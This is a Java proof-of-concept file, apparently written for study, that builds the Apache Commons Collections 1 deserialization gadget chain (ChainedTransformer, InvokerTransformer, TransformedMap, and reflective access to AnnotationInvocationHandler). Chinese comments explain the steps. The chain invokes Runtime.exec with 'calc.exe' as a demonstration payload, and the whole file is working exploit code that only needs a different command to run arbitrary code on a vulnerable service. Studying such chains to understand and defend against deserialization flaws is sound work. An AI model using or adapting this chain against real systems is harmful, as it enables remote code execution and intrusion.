import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
/*JDK1.8*/
public class CC1_TransformedMap {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
        };

        Transformer chain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();

//        innerMap.put("foo","bar");//不行，key要为value
        innerMap.put("value","bar");
        Map outerMap = TransformedMap.decorate(innerMap, null, chain);
        //反射机制调用AnnotationInvocationHandler类的构造函数
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //访问权限放开，private之类的也能调用
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class ,outerMap);

//        FileStream.writeSer(instance,"CC1_TransformedMap.ser");
        FileStream.readSer("CC1_TransformedMap.ser");

    }
}
